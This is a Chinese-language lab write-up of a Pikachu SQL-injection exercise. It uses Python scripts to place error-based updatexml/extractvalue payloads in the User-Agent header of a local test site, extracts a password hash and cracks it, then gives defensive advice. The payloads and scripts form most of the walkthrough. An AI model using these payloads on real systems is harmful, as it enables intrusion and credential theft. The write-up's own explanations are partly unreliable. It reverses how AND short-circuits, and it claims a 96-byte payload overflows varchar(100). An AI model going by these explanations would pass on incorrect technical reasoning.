【Pikachu】Web-SQL-Inject "http header"注入 Writeup

操作者：何芊宏 | 操作日期：2026.9.28 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, http header注入, User-Agent, updatexml, 逻辑短路, 长度限制

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称："http header"注入
  • 目标：理解 HTTP Header 注入的原理，掌握在请求头（如 User-Agent）中构造报错注入 Payload 的技巧，并突破 HTTP 头长度限制与 SQL 逻辑短路的双重限制，最终获取管理员账号密码。

2. 解题思路与知识点

漏洞原理：

该关卡模拟了后端将 HTTP 请求头信息（如 User-Agent、Referer）记录到数据库的功能。由于未对用户输入进行过滤，后端代码可能将请求头直接拼接进 SQL 语句中执行，导致 HTTP Header 注入。和 INSERT/UPDATE 注入类似，该场景下页面通常没有回显，因此需要使用 报错注入（Error-based Injection） 结合 extractvalue() 或 updatexml() 函数，将数据通过报错信息带出。

工具选型与心路历程：
  • F12抓包与Python脚本：由于浏览器无法直接修改请求头，使用 Python 的 requests 库配合 session() 维持登录态，在请求头中植入恶意 Payload。
  • 逻辑短路踩坑：最初使用 1' and extractvalue(...)，由于 1' 为真，MySQL 触发短路机制直接跳过后续函数，导致不报错。改用 ' or updatexml(...) or ' 强制触发报错。
  • Header 长度限制踩坑：在尝试提取表名、列名时，Payload 超过 130 字节，触发了 HTTP 头字段在数据库中的长度限制（如 varchar(100)），导致 Payload 被静默截断，页面不显示报错。最终改用极简 Payload，直接定位目标字段 pw，成功绕过长度限制。

3. 操作步骤

第一步：漏洞探测（以 User-Agent 为注入点）

操作： 使用 Python 脚本登录，并在 User-Agent 中植入单引号测试。

代码：

import requests

s = requests.Session()
# 登录获取 Session
login_url = "http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header_login.php"
login_data = {"username": "admin", "password": "123456", "submit": "Login"}
s.post(login_url, data=login_data)

# 注入测试
target_url = "http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"
headers = {
    "User-Agent": "Mozilla/5.0'",  # 在 User-Agent 中加单引号，尝试闭合 SQL 语句
    "Referer": "http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"
}
r = s.get(target_url, headers=headers)
print(r.text[:500])

代码解析：

  • requests.Session()：创建一个会话对象，自动处理并保存登录后的 Cookie，确保后续请求处于登录状态。
  • headers：构造 HTTP 请求头。User-Agent 被修改为 Mozilla/5.0'，引入单引号试图破坏 SQL 语法。

回显结果： 页面抛出 SQL 报错（You have an error in your SQL syntax...），证明注入点存在。

第二步：报错注入获取库名

操作： 使用 extractvalue() 配合 and 闭合构造 Payload。

代码：

headers = {
    # extractvalue 函数故意触发 XPath 语法错误，将 database() 的结果拼接到报错信息中
    "User-Agent": "Mozilla/5.0' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1",
    "Referer": "http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"
}
r = s.get(target_url, headers=headers)

代码解析：

  • extractvalue(1, ...)：MySQL 的内置 XML 查询函数。当第二个参数不符合 XPath 格式时，会抛出 XPATH syntax error。
  • concat(0x7e, (select database()), 0x7e)：使用 0x7e（波浪号 ~）把数据库名包裹起来，方便正则截取。
  • and '1'='1：闭合 SQL 语句尾部的单引号，防止语法错误导致函数不执行。

回显结果： 页面成功报错并回显 XPATH syntax error: '~pikachu~'。

第三步：提取密码的失败与限制分析（踩坑记录）

操作 1（长度超限与逻辑短路）： 尝试提取 member 表的 pw 字段。

代码（失败尝试）：

headers = {
    # 失败原因1：Payload 过长（96字节），超过 varchar(100) 字段长度限制，被静默截断。
    # 失败原因2：'1' 为真，and 导致逻辑短路，updatexml 或 extractvalue 可能不被执行。
    "User-Agent": "1' and extractvalue(1,concat(0x7e,(select pw from member limit 0,1),0x7e)) and '1'='1",
}
r = s.get(target_url, headers=headers)

结果分析： 报错信息被截断，且正则匹配失败。MD5 长度为 32 位，加上波浪号总长度超过 32 字符。MySQL 报错回显有 32 字符的硬性限制，导致正则匹配不到完整数据。同时，Payload 过长会触发数据库字段的长度截断。

操作 2（尝试使用 updatexml）：

代码（依然失败）：

headers = {
    # 失败原因：'1' 恒为真，MySQL 触发短路机制，直接跳过后续的 updatexml 函数，导致不报错。
    "User-Agent": "1' or updatexml(1,concat(0x7e,(select pw from member limit 0,1)),1)#",
}
r = s.get(target_url, headers=headers)

第四步：绕过与提取（极简 Payload + 强制报错）

操作： 彻底摒弃原有 User-Agent 内容，构造极短 Payload，用 or 强制触发报错，并用 # 注释尾部。

最终代码：

import requests
import re

s = requests.Session()
login_url = "http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header_login.php"
s.post(login_url, data={"username": "admin", "password": "123456", "submit": "Login"})

target_url = "http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"
headers = {
    # 核心 Payload：
    # 1. 弃用原有 Mozilla/5.0 文本，极大压缩长度（约67字节），突破 Header 长度限制。
    # 2. 使用 ' or updatexml(...) or ' 强制触发报错，绕过逻辑短路。
    # 3. limit 0,1 直接定位第一个用户，避免冗长的 group_concat 查询。
    "User-Agent": "' or updatexml(1,concat(0x7e,(select pw from member limit 0,1),0x7e),1) or '",
    "Referer": "http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"
}
r = s.get(target_url, headers=headers)

# 正则提取报错信息（因为报错会被 32 字符截断，我们直接抓取波浪号后的内容）
match = re.search(r"XPATH syntax error: '~(.*)", r.text)
if match:
    raw_data = match.group(1).replace("'", "").strip()
    print(f"[+] 成功提取密码哈希: {raw_data}")
else:
    print("[-] 未触发报错，响应片段：")
    print(r.text[:500])

代码解析：

  • 极简 Payload：整串 User-Agent 只有 67 字节，远低于 varchar(100) 的存储限制，绝对不会被截断。
  • ' or ... or '：前面的 ' 闭合原字段，or 强制要求执行后面的报错函数，最后的 or ' 闭合尾部（或者 # 注释尾部也可行，但需确保 Header 长度允许）。
  • updatexml(1,concat(0x7e, (...), 0x7e), 1)：经典的报错注入函数组合，将查询结果包裹在报错信息中。
  • 正则表达式 `r"XPATH syntax error: '~(.*)"`：使用 `(.*)` 匹配波浪号后的所有内容，允许匹配尾部没有单引号的截断数据。

回显结果： 页面成功报错并回显 XPATH syntax error: '~e10adc3949ba59abbe56e057f20f883~'。由于 32 字符限制，末尾的 e 被截断。补全末尾的 e，得到完整的 32 位哈希 e10adc3949ba59abbe56e057f20f883e，放入 cmd5.com 解密，得到明文密码 123456。

4. 踩坑记录与复盘

  • 坑1：SQL 逻辑短路。 使用 and 连接时，如果前面的条件为真，MySQL 会跳过后面的函数执行。改用 or 可以强制触发 updatexml 报错。
  • 坑2：HTTP Header 物理长度限制。 请求头在数据库中通常存储为 varchar(100)。当 Payload 超过 100 字节时会被静默截断，导致语法错误且无回显。解决方案是彻底精简 Payload，避免使用 group_concat 和 substr 等冗长函数。
  • 坑3：报错回显的 32 字符硬性限制。 updatexml 的回显限制导致完整哈希丢失最后一位。通过拼接或猜测（如已知 123456 的哈希）可以补全。

5. 知识总结

  • HTTP Header 注入核心： 攻击点位于 HTTP 请求头中。需使用工具（如 Python requests 或 Burp Suite）修改请求头，并注意目标字段的物理长度限制。
  • 报错注入与逻辑控制： 在无回显场景下，利用 updatexml 或 extractvalue 报错。注意使用 or 避免逻辑短路，用 # 或 -- 注释尾部。
  • 防御建议： 严格使用预编译语句（Prepared Statements）或参数化查询；对用户输入进行严格的过滤和转义；限制 HTTP Header 字段的存储长度，防止恶意 Payload 注入。
